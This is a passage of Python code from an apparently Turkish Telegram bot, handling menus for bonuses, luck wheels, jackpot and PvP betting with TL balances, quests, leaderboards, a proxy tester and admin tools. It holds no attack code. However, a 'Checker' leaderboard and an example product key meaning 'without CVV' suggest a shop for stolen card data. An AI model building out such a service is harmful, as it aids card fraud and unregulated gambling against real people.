      bot.send_message(chat_id, msg, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "menu_weekly_lb":
    safe_answer()
    try:
      touch_presence(user_id)
      bump_activity(user_id, 1)
    except Exception:
      pass
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔥 Check-in", callback_data="daily_checkin"))
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_engagement"))
    bot.send_message(chat_id, weekly_leaderboard_text(user_id), reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "claim_quest_reward":
    safe_answer()
    ok, amount = claim_quest_reward(user_id)
    if ok:
      bump_activity(user_id, 5)
      bot.send_message(chat_id, f"✅ Görev tamam! **+{amount:.0f} TL**", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, "❌ Görev henüz bitmedi veya ödül alındı.\n" + engagement_hub_text(user_id), parse_mode="Markdown")
    return

  elif call.data == "claim_group_code":
    safe_answer()
    user_states[chat_id] = "waiting_group_code"
    bot.send_message(chat_id, "🎟 Grup kodunu yaz (ör. `YAZ25`)\\n/iptal", parse_mode="Markdown")
    return

  elif call.data == "admin_group_codes":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    lines = ["🎟 **Grup kodları**\n"]
    for c, m in list(group_claim_codes.items())[:30]:
      lines.append(f"• `{c}` → {m.get('reward')} TL · {m.get('uses',0)}/{m.get('max_uses')} · {m.get('note','')}")
    if len(lines) == 1:
      lines.append("_Kod yok_")
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("➕ Yeni kod", callback_data="admin_group_code_new"))
    for c in list(group_claim_codes.keys())[:15]:
      markup.add(types.InlineKeyboardButton(f"🗑 {c}", callback_data=f"admin_group_code_del_{c}"))
    markup.add(types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"))
    bot.send_message(chat_id, "\n".join(lines)[:3500], reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_group_code_new":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    user_states[chat_id] = "waiting_admin_group_code"
    bot.send_message(
      chat_id,
      "Yeni kod formatı:\\n"
      "`KOD ODUL MAX_KULLANIM`\\n"
      "Örnek: `YAZ25 5 200`\\n"
      "İstersen 4. kelime not:\\n`YAZ25 5 200 haftasonu`\\n/iptal",
      parse_mode="Markdown",
    )
    return

  elif call.data and call.data.startswith("admin_group_code_del_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    code = call.data.replace("admin_group_code_del_", "")
    group_claim_codes.pop(code, None)
    save_data()
    bot.send_message(chat_id, f"🗑 `{code}` silindi", parse_mode="Markdown")
    return

  elif call.data == "claim_daily_bonus":
    safe_answer()
    try:
      update_login_streak(user_id)
    except Exception:
      pass
    ok, amount = claim_daily_bonus(user_id)
    if ok:
      bump_activity(user_id, 2)
      bot.send_message(chat_id, f"🎁 **Günlük Bonus Alındı!**\n\n💵 **+{amount:.2f} TL** bakiyenize eklendi.\n💳 Yeni Bakiye: **{user_balances.get(user_id, 0):.2f} TL**\n\nYarın tekrar alabilirsiniz!", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, "❌ Bugünkü günlük bonusunuzu zaten aldınız!\nYarın tekrar deneyin.", parse_mode="Markdown")
    return

  elif call.data == "view_jackpot":
    safe_answer()
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    text = (
      f"🎰 **JACKPOT HAVUZU**\n\n"
      f"💰 Güncel Havuz: **{jackpot_pool:.2f} TL**\n"
      f"📊 Her bahisten **%{int(JACKPOT_PERCENT*100)}** havuza eklenir.\n"
      f"🎲 Kazanma şansı: **%{int(JACKPOT_CHANCE*100)}**\n\n"
      f"Kumar oynarken şansın yaver giderse jackpot patlar!"
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "view_tournament":
    safe_answer()
    top = get_tournament_top(10)
    text = "🏆 **TURNUVA SIRALAMASI** (Net Kumar Kazancı)\n\n"
    if top:
      for i, (uid, profit) in enumerate(top, 1):
        medal = "🥇" if i == 1 else ("🥈" if i == 2 else ("🥉" if i == 3 else f"#{i}"))
        text += f"{medal} `{uid}` — **{profit:.2f} TL**\n"
    else:
      text += "Henüz sıralama yok. Kumar oynayın!\n"
    text += f"\n💵 Sizin net: **{gambling_profits.get(user_id, 0):.2f} TL**"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "spin_wheel":
    safe_answer()
    today = datetime.now().strftime("%Y-%m-%d")
    if wheel_claims.get(user_id) == today:
      bot.send_message(chat_id, "❌ Bugün çark hakkınızı kullandınız!")
      return
    prizes = [0, 1, 2, 3, 5, 10, 0, 1, 2, 25]
    win = random.choice(prizes)
    wheel_claims[user_id] = today
    if win > 0:
      user_balances[user_id] = user_balances.get(user_id, 0.0) + win
      add_balance_history(user_id, "wheel", win, "Şans çarkı")
      add_xp(user_id, 5)
      bot.send_message(chat_id, f"🎡 **ŞANS ÇARKI**\n\n🎉 Kazandınız: **+{win:.0f} TL**\n💳 Bakiye: **{user_balances[user_id]:.2f} TL**", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, "🎡 **ŞANS ÇARKI**\n\n😢 Bu sefer boş geldi. Yarın tekrar!", parse_mode="Markdown")
    save_data()
    return

  elif call.data == "daily_lucky_box":
    safe_answer()
    today = datetime.now().strftime("%Y-%m-%d")
    if daily_box_claims.get(user_id) == today:
      bot.send_message(chat_id, f"❌ Bugünkü şans kutunu zaten açtın.\n⏳ {daily_box_remaining_str(user_id)}", parse_mode="Markdown")
      return
    daily_box_claims[user_id] = today
    prize_roll = random.random()
    if prize_roll < 0.40:
      amt = random.choice([50, 75, 100, 150])
      add_gamble_bal(user_id, amt)
      msg = f"🎁 **Şans Kutusu**\n\n🎲 +{amt} TL **kumar bakiyesi**\n💳 Kumar: **{get_gamble_bal(user_id):.2f} TL**"
    elif prize_roll < 0.70:
      amt = random.choice([5, 10, 15, 20])
      user_balances[user_id] = user_balances.get(user_id, 0.0) + amt
      add_balance_history(user_id, "daily_box", amt, "Şans kutusu")
      msg = f"🎁 **Şans Kutusu**\n\n💵 +{amt} TL **normal bakiye**\n💳 Normal: **{user_balances[user_id]:.2f} TL**"
    elif prize_roll < 0.90:
      xp = random.choice([10, 15, 25])
      add_xp(user_id, xp)
      msg = f"🎁 **Şans Kutusu**\n\n⭐ +{xp} XP"
    else:
      amt = random.choice([200, 300, 500])
      add_gamble_bal(user_id, amt)
      msg = f"🎁 **Şans Kutusu — NADİR!**\n\n🎲 +{amt} TL kumar bakiyesi!\n💳 Kumar: **{get_gamble_bal(user_id):.2f} TL**"
    save_data()
    bot.send_message(chat_id, msg, parse_mode="Markdown")
    return

  elif call.data == "lucky_today":
    safe_answer()
    score = random.randint(1, 100)
    if score >= 90:
      txt = f"🍀 Bugün şansın **patlama** ({score}/100)! Kumarda dikkatli ol, belki döner."
    elif score >= 70:
      txt = f"✨ Bugün **iyi** görünüyor ({score}/100)."
    elif score >= 40:
      txt = f"😐 Orta şans ({score}/100). Risk alma."
    else:
      txt = f"😅 Bugün pek yok ({score}/100). Belki yarın."
    bot.send_message(chat_id, txt, parse_mode="Markdown")
    return

  elif call.data == "view_quests":
    safe_answer()
    today = datetime.now().strftime("%Y-%m-%d")
    q = daily_quests.get(user_id, {})
    if q.get("date") != today:
      q = {"date": today, "slot": 0, "ilan": 0, "claimed": False}
    text = (
      f"📋 **GÜNLÜK GÖREVLER**\n\n"
      f"🎰 3 Slot oyna: **{q.get('slot',0)}/3**\n"
      f"📢 1 İlan ekle: **{q.get('ilan',0)}/1**\n\n"
    )
    markup = types.InlineKeyboardMarkup()
    if check_quest_complete(user_id):
      text += "✅ Tüm görevler tamam! Ödülünü al."
      markup.add(types.InlineKeyboardButton("🎁 Ödülü Al (+10 TL)", callback_data="claim_quest"))
    elif q.get("claimed"):
      text += "🎉 Bugünkü ödül alındı."
    else:
      text += "Görevleri tamamla, +10 TL kazan!"
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "level_shop":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    for kid, item in LEVEL_SHOP.items():
      markup.add(types.InlineKeyboardButton(
        f"{item['name']} ({item['xp_cost']} XP)",
        callback_data=f"level_buy_{kid}",
      ))
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    try:
      bot.edit_message_text(get_level_shop_text(user_id), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, get_level_shop_text(user_id), reply_markup=markup, parse_mode="Markdown")

  elif call.data.startswith("level_buy_"):
    safe_answer()
    key = call.data.replace("level_buy_", "", 1)
    ok, msg = buy_level_shop_item(user_id, key)
    bot.send_message(chat_id, msg, parse_mode="Markdown")

  elif call.data == "view_rankings":
    safe_answer()
    lines = ["🏅 **Sıralamalar**\n\n⭐ **XP Top 10**"]
    for i, (uid, xp) in enumerate(get_xp_leaderboard(10), 1):
      lines.append(f"{i}. `{uid}` — {xp} XP")
    lines.append("\n🎮 **Checker Top 10**")
    chk = get_checker_leaderboard(10)
    if not chk:
      lines.append("Henüz veri yok.")
    for i, (uid, n) in enumerate(chk, 1):
      lines.append(f"{i}. `{uid}` — {n} kullanım")
    try:
      from collections import Counter
      cnt = Counter(user_referrers.values())
      lines.append("\n👥 **Davet (tüm zaman)**")
      for i, (uid, n) in enumerate(cnt.most_common(10), 1):
        lines.append(f"{i}. `{uid}` — {n} davet")
    except Exception:
      pass
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    try:
      bot.edit_message_text("\n".join(lines), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "\n".join(lines), reply_markup=markup, parse_mode="Markdown")

  elif call.data == "tool_proxy_test":
    safe_answer()
    user_states[chat_id] = "waiting_proxy_test"
    bot.send_message(
      chat_id,
      "🔗 **Proxy Test**\n\n"
      "Test edilecek proxy'yi yaz (tek satır veya birden fazla):\n"
      "`ip:port` veya `user:pass@ip:port` veya `http://...`\n\n"
      "İptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "my_tickets":
    safe_answer()
    markup = types.InlineKeyboardMarkup().add(
      types.InlineKeyboardButton("✍️ Yeni Talep", callback_data="support_new_ticket"),
      types.InlineKeyboardButton("🔙 Destek", callback_data="menu_support"),
    )
    try:
      bot.edit_message_text(support_tickets_text(user_id), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, support_tickets_text(user_id), reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_bot_status":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"))
    try:
      bot.edit_message_text(bot_status_text(), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, bot_status_text(), reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_backup_now":
    if user_id not in admin_ids_set:
      return
    safe_answer("Yedek alınıyor...")
    try:
      dest = do_backup(notify_admins=False)
      if dest and os.path.isfile(dest):
        with open(dest, "rb") as f:
          bot.send_document(chat_id, f, caption=f"💾 Yedek: `{os.path.basename(dest)}`", parse_mode="Markdown")
      else:
        bot.send_message(chat_id, "⚠️ Yedek oluşturulamadı.")
    except Exception as e:
      bot.send_message(chat_id, f"❌ Yedek hatası: {e}")

  elif call.data == "admin_flood_settings":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton(f"MSG limit: {MSG_SPAM_LIMIT} / {MSG_SPAM_TIME}s", callback_data="noop_flood"),
      types.InlineKeyboardButton("✏️ Limit değiştir", callback_data="admin_flood_edit"),
      types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"),
    )
    bot.send_message(
      chat_id,
      f"🛡️ **Flood Ayarları**\n\n"
      f"Mesaj: max **{MSG_SPAM_LIMIT}** / **{MSG_SPAM_TIME}s**\n"
      f"Callback: max **{CB_SPAM_LIMIT}** / **{CB_SPAM_TIME}s**\n"
      f"Ban süresi: **{TEMP_BAN_DURATION // 3600}s**\n\n"
      f"Değiştirmek için: `limit 8 3` (adet saniye)",
      reply_markup=markup,
      parse_mode="Markdown",
    )

  elif call.data == "admin_flood_edit":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    user_states[chat_id] = "waiting_flood_settings"
    bot.send_message(chat_id, "Yaz: `limit 8 3`\n(8 mesaj / 3 saniye)\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "claim_quest":
    ok, reward = claim_quest_reward(user_id)
    if ok:
      safe_answer(f"+{reward:.0f} TL!", show_alert=True)
      bot.send_message(chat_id, f"🎁 Görev ödülü: **+{reward:.0f} TL**", parse_mode="Markdown")
    else:
      safe_answer("Ödül alınamaz!", show_alert=True)
    return

  elif call.data == "view_level":
    safe_answer()
    xp = user_xp.get(user_id, 0)
    lvl = user_level.get(user_id, 1)
    next_xp = lvl * 100
    text = f"⭐ **SEVİYE SİSTEMİ**\n\n🏅 Level: **{lvl}**\n✨ XP: **{xp}/{next_xp}**\n\nHer 100 XP = 1 level\nLevel atlayınca bonus bakiye!"
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "view_balance_history":
    safe_answer()
    call.data = "bal_hist_all"
    hist = filter_balance_history(user_id, "all", 20)
    lines = ["💳 **Bakiye geçmişi — Tümü**\n"]
    if not hist:
      lines.append("_Kayıt yok._")
    for h in reversed(hist):
      lines.append(f"• `{h.get('type')}` {float(h.get('amount') or 0):+.2f} — {h.get('note','')} · _{h.get('time')}_")
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
      types.InlineKeyboardButton("Tümü", callback_data="bal_hist_all"),
      types.InlineKeyboardButton("Market", callback_data="bal_hist_market"),
      types.InlineKeyboardButton("Kumar", callback_data="bal_hist_gamble"),
    )
    markup.add(
      types.InlineKeyboardButton("Admin", callback_data="bal_hist_admin"),
      types.InlineKeyboardButton("Diğer", callback_data="bal_hist_other"),
      types.InlineKeyboardButton("🔙", callback_data="menu_bakiye"),
    )
    bot.send_message(chat_id, "\n".join(lines)[:4000], reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "view_notifications":
    safe_answer()
    notifs = user_notifications.get(user_id, [])
    text = "🔔 **BİLDİRİMLER**\n\n"
    if not notifs:
      text += "Bildirim yok."
    else:
      for n in reversed(notifs[-10:]):
        mark = "🟢" if not n.get("read") else "⚪"
        text += f"{mark} {n['text']}\n`{n['time']}`\n\n"
      for n in notifs:
        n["read"] = True
      save_data()
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "toggle_currency":
    cur = user_currency.get(user_id, "TL")
    user_currency[user_id] = "USDT" if cur == "TL" else "TL"
    save_data()
    safe_answer(f"Para birimi: {user_currency[user_id]}", show_alert=True)
    bal = user_balances.get(user_id, 0)
    bot.send_message(chat_id, f"💱 Para birimi: **{user_currency[user_id]}**\nBakiye: {format_balance(user_id, bal)}", parse_mode="Markdown")
    return

  elif call.data == "pvp_start":
    safe_answer()
    user_states[chat_id] = "waiting_pvp_target"
    bot.send_message(chat_id, "⚔️ **Arkadaşla Bahis**\n\nRakibin Telegram ID'sini yazın:")
    return

  elif call.data.startswith("pvp_accept_"):
    chal_id = call.data.split("_")[2]
    if chal_id not in pvp_challenges:
      safe_answer("Challenge bulunamadı!", show_alert=True)
      return
    ch = pvp_challenges[chal_id]
    if user_id != ch["target"]:
      safe_answer("Bu challenge size değil!", show_alert=True)
      return
    bet = ch["bet"]
    if user_balances.get(user_id, 0) < bet:
      safe_answer("Yetersiz bakiye!", show_alert=True)
      return
    user_balances[user_id] -= bet
    add_to_jackpot(bet)
    winner = random.choice([ch["challenger"], ch["target"]])
    loser = ch["target"] if winner == ch["challenger"] else ch["challenger"]
    pot = bet * 2
    user_balances[winner] = user_balances.get(winner, 0) + pot
    update_gambling_profit(winner, bet)
    update_gambling_profit(loser, -bet)
    add_balance_history(winner, "pvp_win", pot, f"vs {loser}")
    add_balance_history(loser, "pvp_lose", -bet, f"vs {winner}")
    add_xp(winner, 15)
    del pvp_challenges[chal_id]
    save_data()
    safe_answer("Sonuçlandı!")
    try:
      bot.send_message(winner, f"⚔️ **PvP KAZANDIN!** +{pot:.2f} TL", parse_mode="Markdown")
      bot.send_message(loser, f"⚔️ **PvP KAYBETTİN!** -{bet:.2f} TL", parse_mode="Markdown")
    except:
      pass
    return

  elif call.data.startswith("pvp_reject_"):
    chal_id = call.data.split("_")[2]
    if chal_id in pvp_challenges:
      ch = pvp_challenges[chal_id]
      user_balances[ch["challenger"]] = user_balances.get(ch["challenger"], 0) + ch["bet"]
      del pvp_challenges[chal_id]
      save_data()
      try:
        bot.send_message(ch["challenger"], "⚔️ PvP challenge reddedildi. Bahis iade edildi.")
      except:
        pass
    safe_answer("Reddedildi")
    return

  elif call.data == "admin_backup":
    if user_id not in admin_ids_set: return
    safe_answer()
    dest = do_backup()
    if dest:
      try:
        with open(dest, "rb") as f:
          bot.send_document(chat_id, f, caption=f"💾 Yedek alındı: `{os.path.basename(dest)}`", parse_mode="Markdown")
      except:
        bot.send_message(chat_id, f"💾 Yedek: `{dest}`", parse_mode="Markdown")
      log_activity("backup", user_id, dest)
    else:
      bot.send_message(chat_id, "❌ Yedek alınamadı.")
    return

  elif call.data == "admin_view_logs":
    if user_id not in admin_ids_set: return
    safe_answer()
    text = "📋 **SON AKTİVİTE LOGLARI**\n\n"
    for log in reversed(activity_logs[-20:]):
      text += f"`{log['time']}` | {log['action']} | `{log['user_id']}` | {log['detail']}\n"
    if not activity_logs:
      text += "Log yok."
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"))
    bot.send_message(chat_id, text[:4000], reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_spam_dash":
    if user_id not in admin_ids_set: return
    safe_answer()
    temp_count = len([u for u, t in temp_banned_users.items() if time.time() < t])
    text = (
      f"📊 **SPAM DASHBOARD**\n\n"
      f"🔴 Kalıcı ban: **{len(banned_users)}**\n"
      f"🟡 Süreli ban: **{temp_count}**\n"
      f"📨 Aktif msg spam takip: **{len(user_request_times)}**\n"
      f"🔘 Aktif cb spam takip: **{len(callback_request_times)}**\n"
      f"📜 Log kaydı: **{len(activity_logs)}**\n\n"
      f"⚡ **Son 60 sn en aktif:**\n"
    )
    top = get_top_spam_users(10)
    if top:
      for uid, score in top:
        text += f"`{uid}` → {score} istek\n"
    else:
      text += "Yok\n"
    markup = types.InlineKeyboardMarkup(row_width=1)
    for uid, score in top[:5]:
      markup.add(types.InlineKeyboardButton(f"⏳ 1g ban {uid}", callback_data=f"admin_u_1d_ban_{uid}"))
    markup.add(types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"))
    bot.send_message(chat_id, text[:4000], reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_withdraw_settings":
    if user_id not in admin_ids_set: return
    safe_answer()
    text = f"⏳ **Çekim Ayarları**\n\nMin: **{min_withdraw:.0f} TL**\nKomisyon: **%{withdraw_commission*100:.0f}**\n\nDeğiştirmek için:\n`min 50` veya `komisyon 0.1` yazın"
    user_states[chat_id] = "waiting_withdraw_settings"
    bot.send_message(chat_id, text, parse_mode="Markdown")
    return

  elif call.data == "admin_set_maint_msg":
    if user_id not in admin_ids_set: return
    safe_answer()
    user_states[chat_id] = "waiting_maint_msg"
    bot.send_message(chat_id, "📝 Yeni bakım mesajını yazın:")
    return

  elif call.data == "admin_add_market_item":
    if user_id not in admin_ids_set: return
    safe_answer()
    user_states[chat_id] = "waiting_new_market_key"
    bot.send_message(chat_id, "🛒 Yeni ürün anahtar adı yazın (örn: `2x_cvvsiz`):\nSadece harf, rakam, alt çizgi.")
    return

  elif call.data == "admin_graceful_stop":
    if user_id not in admin_ids_set: return
    safe_answer("Bot kapatılıyor...", show_alert=True)
    global bot_running
    bot_running = False
    save_data()
    do_backup()
    bot.send_message(chat_id, "🛑 **Graceful shutdown**\nYedek alındı, bot duruyor...")
    log_activity("shutdown", user_id, "graceful")
    def _stop():
      time.sleep(2)
      os._exit(0)
    threading.Thread(target=_stop).start()
    return

  elif call.data == "admin_restart":
    if user_id not in admin_ids_set: return
    safe_answer("Yeniden başlatılıyor...", show_alert=True)
    save_data()
    do_backup()
    bot.send_message(chat_id, "♻️ **Yeniden başlatılıyor...**\nYedek alındı.")
    log_activity("restart", user_id, "graceful")
    def _restart():
      time.sleep(2)
      os.execv(sys.executable, [sys.executable] + sys.argv)
    threading.Thread(target=_restart).start()
    return

  elif call.data == "admin_error_logs":
    if user_id not in admin_ids_set: return
    safe_answer()
    tail = read_error_log_tail(25)
    bot.send_message(chat_id, f"📜 **Son Hata Logları**\n\n```\n{tail[-3500:]}\n```", parse_mode="Markdown")
    return

  elif call.data == "admin_create_poll":
    if user_id not in admin_ids_set: return
    safe_answer()
    user_states[chat_id] = "waiting_poll_question"
    bot.send_message(chat_id, "📊 Anket sorusunu yazın:\nSonra seçenekleri `seçenek1 | seçenek2 | seçenek3` formatında isteyeceğim.")
    return

  elif call.data == "admin_clear_hard_bans":
    if user_id not in admin_ids_set:
      safe_answer("Yetkiniz yok", show_alert=True)
      return
    n = len(hard_banned_users)
    ids = list(hard_banned_users)
    hard_banned_users.clear()
    for tid in ids:
      banned_users.discard(tid)
      temp_banned_users.pop(tid, None)
      support_warns.pop(tid, None)
    save_data()
    safe_answer(f"{n} süper ban açıldı", show_alert=True)
    bot.send_message(chat_id, f"🔓 **{n}** süper ban kaldırıldı.\nID listesi: `{ids[:30]}`")
    for tid in ids:
      try:
        bot.send_message(tid, "✅ Banınız kaldırıldı. Botu tekrar kullanabilirsiniz.")
      except Exception:
        pass
    return

  elif call.data == "admin_toggle_maintenance":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    new_val = not maintenance_mode
    set_maintenance(new_val)
    status = "AÇIK 🔴" if new_val else "KAPALI 🟢"
    safe_answer(f"Bakım modu: {status}", show_alert=True)
    bot.send_message(chat_id, f"🔧 **Bakım Modu:** {status}\n\n{'Kullanıcılar bota erişemez.' if new_val else 'Bot normal çalışıyor.'}", parse_mode="Markdown")
    if new_val:
      for uid in list(registered_users)[:50]:
        if uid not in admin_ids_set:
          try:
            bot.send_message(uid, "🔧 Bot bakım moduna alındı. Kısa süre erişilemeyebilir.", parse_mode="Markdown")
          except:
            pass
    return

  elif call.data == "admin_timed_maintenance":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    check_maintenance_expiry()
    rem = maintenance_remaining_str()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
      types.InlineKeyboardButton("15 dk", callback_data="maint_for_15"),
      types.InlineKeyboardButton("30 dk", callback_data="maint_for_30"),
      types.InlineKeyboardButton("1 saat", callback_data="maint_for_60"),
      types.InlineKeyboardButton("2 saat", callback_data="maint_for_120"),
      types.InlineKeyboardButton("6 saat", callback_data="maint_for_360"),
      types.InlineKeyboardButton("✏️ Özel süre (dk)", callback_data="maint_for_custom"),
    )
    markup.add(types.InlineKeyboardButton("🟢 Bakımı Şimdi Kapat", callback_data="admin_toggle_maintenance"))
    markup.add(types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"))
    bot.send_message(
      chat_id,
      f"⏱ **Süreli Bakım**\n\n"
      f"Şu an: **{'AÇIK 🔴' if maintenance_mode else 'KAPALI 🟢'}**\n"
      f"Kalan: **{rem}**\n\n"
      f"Ne kadar süre açık kalsın?",
      reply_markup=markup,
      parse_mode="Markdown"
    )
    return

  elif call.data.startswith("maint_for_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    key = call.data.replace("maint_for_", "")
    if key == "custom":
      safe_answer()
      user_states[chat_id] = "waiting_maint_minutes"
      bot.send_message(chat_id, "⏱ Bakım kaç **dakika** sürsün? (örn: `45`)", parse_mode="Markdown")
      return
    try:
      minutes = int(key)
    except Exception:
      safe_answer("Geçersiz süre", show_alert=True)
      return
    until = set_maintenance_timed(minutes)
    end_str = datetime.fromtimestamp(until).strftime("%d.%m.%Y %H:%M:%S")
    safe_answer(f"Bakım {minutes} dk açıldı", show_alert=True)
    bot.send_message(
      chat_id,
      f"🔧 **Süreli bakım açıldı**\n\n"
      f"⏱ Süre: **{minutes} dakika**\n"
      f"🏁 Bitiş: **{end_str}**\n"
      f"Kalan: **{maintenance_remaining_str()}**\n\n"
      f"Süre dolunca otomatik kapanır. Adminler etkilenmez.",
      parse_mode="Markdown"
    )
    for uid in list(registered_users)[:80]:
      if uid not in admin_ids_set:
        try:
          bot.send_message(
            uid,
            f"🔧 **Bakım modu**\n\n{maintenance_message}\n\n⏱ Tahmini süre: **{minutes} dk**\nKalan: **{maintenance_remaining_str()}**",
            parse_mode="Markdown"
          )
        except Exception:
          pass
    return

  elif call.data == "admin_jackpot_manage":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("💰 Havuzu Sıfırla", callback_data="admin_jackpot_reset"),
      types.InlineKeyboardButton("➕ 100 TL Ekle", callback_data="admin_jackpot_add100"),
      types.InlineKeyboardButton("🔙 Admin Panel", callback_data="menu_admin")
    )
    bot.send_message(chat_id, f"🎰 **Jackpot Yönetimi**\n\n💰 Güncel: **{jackpot_pool:.2f} TL**", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_jackpot_reset":
    if user_id not in admin_ids_set: return
    set_jackpot(0.0)
    safe_answer("Jackpot sıfırlandı!", show_alert=True)
    bot.send_message(chat_id, "✅ Jackpot havuzu sıfırlandı.")
    return

  elif call.data == "admin_jackpot_add100":
    if user_id not in admin_ids_set: return
    set_jackpot(jackpot_pool + 100.0)
    safe_answer("+100 TL eklendi!", show_alert=True)
    bot.send_message(chat_id, f"✅ Jackpot: **{jackpot_pool:.2f} TL**", parse_mode="Markdown")
    return

  elif call.data == "admin_tournament_reward":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    top = get_tournament_top(3)
    if not top:
      bot.send_message(chat_id, "📭 Turnuvada henüz kimse yok.")
      return
    rewards = [50.0, 30.0, 20.0]
    msg = "🏆 **TURNUVA ÖDÜLLERİ DAĞITILDI**\n\n"
    for i, (uid, profit) in enumerate(top):
      if i < len(rewards):
        user_balances[uid] = user_balances.get(uid, 0.0) + rewards[i]
        msg += f"#{i+1} `{uid}` (+{rewards[i]:.0f} TL) — Net: {profit:.2f} TL\n"
        try:
          bot.send_message(uid, f"🏆 **Turnuva Ödülü!**\n\nSıralama: **#{i+1}**\nÖdül: **+{rewards[i]:.0f} TL** bakiyenize eklendi!", parse_mode="Markdown")
        except:
          pass
    save_data()
    bot.send_message(chat_id, msg, parse_mode="Markdown")
    return

  elif call.data == "admin_view_tickets":
    if user_id not in admin_ids_set: return
    safe_answer()
    if not active_tickets: return bot.send_message(chat_id, "📭 Açık destek talebi yok.")
    markup = types.InlineKeyboardMarkup()
    for t_id in active_tickets: markup.add(types.InlineKeyboardButton(f"✉️ Yanıtla ({t_id})", callback_data=f"answer_ticket_{t_id}"))
    bot.send_message(chat_id, "🎫 Açık Talepler:", reply_markup=markup)

  elif call.data.startswith("wd_approve_") or call.data.startswith("wd_reject_"):
    if user_id not in admin_ids_set: return
    safe_answer()
    wd_id = call.data.split("_")[2]
    if wd_id in withdrawal_requests:
      req = withdrawal_requests[wd_id]
      if call.data.startswith("wd_approve_"):
        ref_balances[req['user_id']] -= req['amount']
        try: bot.send_message(req['user_id'], f"🎉 {req['amount']} TL çekim onaylandı!")
        except: pass
      del withdrawal_requests[wd_id]
      save_data()
      try: bot.edit_message_text("✅ İşlem yapıldı.", chat_id, call.message.message_id)
      except: pass

  elif call.data == "claim_channel_bonus":
    safe_answer()
    ok, result = try_claim_channel_bonus(user_id, chat_id)
    if ok:
      pass
    elif result == "already":
      bot.send_message(chat_id, "✅ Kanal ödülünü zaten aldınız.")
    else:
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton("📢 Kanala Git", url=CHANNEL_LINK))
